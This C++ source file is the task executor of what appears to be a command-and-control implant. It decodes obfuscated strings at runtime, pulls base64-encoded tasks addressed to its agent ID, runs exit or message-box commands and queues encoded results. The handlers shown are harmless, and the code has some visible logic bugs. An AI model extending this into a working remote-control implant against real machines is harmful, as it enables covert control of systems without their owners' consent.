#include "executor/executor.h"
#include "utils/buffer.h"
#include "executor/exit_el_patron.h"
#include "executor/messagebox.h"

/* Constructor */
Executor::Executor(WinApiCustom *pWinApiCustom, Queue *pTaskInputQueue, Queue *pTaskOutputQueue, Event *pAgentShouldStop, PCHAR agentId, DWORD executorIntervalMs)
    : pWinApiCustom(pWinApiCustom),
      pTaskInputQueue(pTaskInputQueue),
      pTaskOutputQueue(pTaskOutputQueue),
      pEventAgentShouldStop(pAgentShouldStop),
      TaskInputSelfQueue(Queue(pWinApiCustom, FALSE)),
      agentId(agentId),
      executorIntervalMs(executorIntervalMs),
      pTaskAgentSpec(NULL),
      taskAgentSpecSize(0)
{
    // Prepare string to match to identify tasks meant for this agent
    static CHAR strTask[STRING_TASK_LEN + 1] = ""; // "TASK"
    DeobfuscateUtf8String(
        (PCHAR)STRING_TASK,
        STRING_TASK_LEN,
        strTask);

    this->taskAgentSpecSize = STRING_TASK_LEN + 1 + 6; // "TASK" + "-" + "6 char agent id"
    this->pTaskAgentSpec = this->pWinApiCustom->HeapAllocCustom(this->taskAgentSpecSize);
    if (pTaskAgentSpec == NULL)
        this->pWinApiCustom->HeapFreeCustom(this->pTaskAgentSpec);

    CopyBuffer(this->pTaskAgentSpec, strTask, STRING_TASK_LEN);
    CopyBuffer((PBYTE)(this->pTaskAgentSpec) + STRING_TASK_LEN, "-", 1);
    CopyBuffer((PBYTE)(this->pTaskAgentSpec) + STRING_TASK_LEN + 1, this->agentId, 6 + 1); // Agent Id + Agent Id's null terminator        
}

/* Destructor */
Executor::~Executor()
{
}

/* Target for Executor's thread */
void WINAPI Executor::StartExecutorThread(StartExecutorThreadParameters *pExecutorParameters)
{
    // Wait for registration to be complete; proceed only if successful
    if (pExecutorParameters->pEventRegister->Wait(pExecutorParameters->waitTimeForRegistrationMs) == WAIT_OBJECT_0)
    {
        Executor executor = Executor(
            pExecutorParameters->pWinApiCustom,
            pExecutorParameters->pTaskInputQueue,
            pExecutorParameters->pTaskOutputQueue,
            pExecutorParameters->pEventAgentShouldStop,
            pExecutorParameters->agentId,
            pExecutorParameters->executorIntervalMs);
        executor.StartExecutor();
    }
    // If registration has no succeeded in time
    else
        return;
}

/* Runs executor */
void Executor::StartExecutor()
{
    // Prepare strings for generic Task outputs
    static CHAR strAgentCapResponseSuccess[STRING_AGENT_CAP_RESPONSE_SUCCESS_LEN + 1] = ""; // "Success"
    DeobfuscateUtf8String(
        (PCHAR)STRING_AGENT_CAP_RESPONSE_SUCCESS,
        STRING_AGENT_CAP_RESPONSE_SUCCESS_LEN,
        strAgentCapResponseSuccess);

    static CHAR strAgentCapResponseFailed[STRING_AGENT_CAP_RESPONSE_FAILED_LEN + 1] = ""; // "Failed"
    DeobfuscateUtf8String(
        (PCHAR)STRING_AGENT_CAP_RESPONSE_FAILED,
        STRING_AGENT_CAP_RESPONSE_FAILED_LEN,
        strAgentCapResponseFailed);

    // Start executor loop
    PCHAR taskData = NULL;
    LPVOID taskB64 = NULL;
    DWORD taskB64Size = 0;
    LPVOID task = NULL;
    DWORD taskSize = 0;
    LPVOID taskId = NULL;
    DWORD taskIdSize = 0;

    while (TRUE)
    {
        // Gets tasks from Global Task input Queue meant for this agent
        this->GetTasksForSelf();

        // Process self Input queue; for each output, enqueue to global Output queue
        while (this->TaskInputSelfQueue.GetSize() != 0)
        {
            taskData = (PCHAR)(this->TaskInputSelfQueue.Dequeue()); // "TASK-123ABC-14-base64(input)"

            // Validate task data
            if (GenericSeparatedArrayNumOfStringElements(taskData, "-") != 3)
                goto CLEANUP_TASK;

            // Get task string
            taskB64Size = 0;
            if (!GenericSeparatedArrayStringAt(taskData, "-", 3, NULL, &taskB64Size))
                goto CLEANUP_TASK;
            if (taskB64Size == 0)
                goto CLEANUP_TASK;

            taskB64 = this->pWinApiCustom->HeapAllocCustom(taskB64Size + 1);
            if (taskB64 == NULL)
                goto CLEANUP_TASK;
            if (!GenericSeparatedArrayStringAt(taskData, "-", 3, (PCHAR)taskB64, &taskB64Size))
                goto CLEANUP_TASK;

            task = this->pWinApiCustom->HeapAllocCustom(((StrLen((PCHAR)taskB64) / 4) * 3) + 1);
            if (task == NULL)
                goto CLEANUP_TASK;

            taskSize = 0;
            Base64Decode((PCHAR)taskB64, (PUCHAR)task, &taskSize);
            if (taskSize == 0)
                goto CLEANUP_TASK;

            // Get task ID
            taskIdSize = 0;
            if (!GenericSeparatedArrayStringAt(taskData, "-", 2, NULL, &taskIdSize))
                goto CLEANUP_TASK;
            if (taskIdSize == 0)
                goto CLEANUP_TASK;

            taskId = this->pWinApiCustom->HeapAllocCustom(taskIdSize + 1);
            if (taskId == NULL)
                goto CLEANUP_TASK;
            if (!GenericSeparatedArrayStringAt(taskData, "-", 2, (PCHAR)taskId, &taskIdSize))
                goto CLEANUP_TASK;

            // Execute the task
            try
            {
                //// EXIT
                if (IsTaskForExit(task))
                {
                    this->pEventAgentShouldStop->Set();
                    this->SetOutputInOutputQueue((PCHAR)taskId, strAgentCapResponseSuccess, FALSE);
                }

                //// MESSAGEBOX
                else if (IsTaskForMessageBox(task))
                {
                    HandleTaskMessageBox(this->pWinApiCustom, task);
                    this->SetOutputInOutputQueue((PCHAR)taskId, strAgentCapResponseSuccess, FALSE);
                }

                //// FALLBACK
                else {
                    this->SetOutputInOutputQueue((PCHAR)taskId, strAgentCapResponseFailed, FALSE);
                }
            }
            catch (...)
            {
                this->SetOutputInOutputQueue((PCHAR)taskId, strAgentCapResponseFailed, FALSE);
            }

        CLEANUP_TASK:
            if (taskData != NULL)
            {
                this->pWinApiCustom->HeapFreeCustom(taskData);
                taskData = NULL;
            };

            if (taskB64 != NULL)
            {
                this->pWinApiCustom->HeapFreeCustom(taskB64);
                taskB64 = NULL;
            }

            if (task != NULL)
            {
                this->pWinApiCustom->HeapFreeCustom(task);
                task = NULL;
            }

            if (taskId != NULL)
            {
                this->pWinApiCustom->HeapFreeCustom(taskId);
                taskId = NULL;
            }
        }

        // Check if agent should exit; if yes, stop executor
        if (this->pEventAgentShouldStop->Wait(this->executorIntervalMs) == WAIT_OBJECT_0)
            break;
    }
}

/*
Enqueues Task output in global Task output queue
*/
void Executor::SetOutputInOutputQueue(IN PCHAR taskId, IN PCHAR taskOutput, BOOL shouldFreeTaskOutputBuffer)
{
    // TASK_OUTPUT-12-base64(output)

    // Get Task ID length
    DWORD taskIdLen = StrLen(taskId);

    // Convert Task string to base64
    DWORD taskOutputLen = StrLen(taskOutput);
    LPVOID taskOutputB64 = this->pWinApiCustom->HeapAllocCustom((((taskOutputLen + 2) / 3) * 4));
    if (taskOutputB64 == NULL)
        goto CLEANUP;

    if (!Base64Encode((PUCHAR)taskOutput, taskOutputLen, (PCHAR)taskOutputB64))
        goto CLEANUP;
    DWORD taskOutputB64Len = StrLen((PCHAR)taskOutputB64);

    // Prepare Task output statement
    static CHAR strTaskOutput[STRING_TASK_OUTPUT_LEN + 1] = ""; // "TASK_OUTPUT"
    DeobfuscateUtf8String(
        (PCHAR)STRING_TASK_OUTPUT,
        STRING_TASK_OUTPUT_LEN,
        strTaskOutput);

    DWORD taskOutputStatementLen = STRING_TASK_OUTPUT_LEN + 1 + taskIdLen + 1 + taskOutputB64Len + 1; // "TASK_OUTPUT" + "-" + "Task ID" + "-" + "Task output base64" + null-byte
    LPVOID taskOutputStatement = this->pWinApiCustom->HeapAllocCustom(taskOutputStatementLen);
    if (taskOutputStatement == NULL)
        goto CLEANUP;

    CopyBuffer(taskOutputStatement, strTaskOutput, STRING_TASK_OUTPUT_LEN);                                                   // "TASK_OUTPUT"
    CopyBuffer((PBYTE)taskOutputStatement + STRING_TASK_OUTPUT_LEN, "-", 1);                                                  // "-"
    CopyBuffer((PBYTE)taskOutputStatement + STRING_TASK_OUTPUT_LEN + 1, taskId, taskIdLen);                                   // "Task ID"
    CopyBuffer((PBYTE)taskOutputStatement + STRING_TASK_OUTPUT_LEN + 1 + taskIdLen, "-", 1);                                  // "-"
    CopyBuffer((PBYTE)taskOutputStatement + STRING_TASK_OUTPUT_LEN + 1 + taskIdLen + 1, taskOutputB64, taskOutputB64Len + 1); // "Task output base64" + null-byte

    // Append to Task output
    if (!this->pTaskOutputQueue->AcquireThreadMutex())
        goto CLEANUP;
    this->pTaskOutputQueue->Enqueue(taskOutputStatement);
    this->pTaskOutputQueue->ReleaseThreadMutex();

CLEANUP:
    if (taskOutputB64 != NULL)
        this->pWinApiCustom->HeapFreeCustom(taskOutputB64);

    if (shouldFreeTaskOutputBuffer && taskOutput != NULL)
        this->pWinApiCustom->HeapFreeCustom(taskOutput);
}

/*
Get tasks for current Agent
*/
void Executor::GetTasksForSelf()
{
    // Acquire thread mutex to read task input queue and pull all tasks meant for this agent
    if (this->pTaskInputQueue->AcquireThreadMutex())
    {
        // If there are input tasks
        DWORD numOfInputTasks = this->pTaskInputQueue->GetSize();
        if (numOfInputTasks != 0)
        {
            // Pull out all tasks meant for this agent, and place them in Executor's own input queue; leave the rest in
            PCHAR taskData = NULL;
            for (int i = 0; i < numOfInputTasks; i++)
            {
                taskData = (PCHAR)(this->pTaskInputQueue->GetDataAtIndex(i, FALSE)); // "TASK-123ABC-14-base64(input)"
                if (CompareBuffer(this->pTaskAgentSpec, taskData, this->taskAgentSpecSize))
                {
                    this->TaskInputSelfQueue.Enqueue(this->pTaskInputQueue->DequeueAt(i));
                }
            }
        }

        // Release acquired thread mutex
        pTaskInputQueue->ReleaseThreadMutex();
    }
}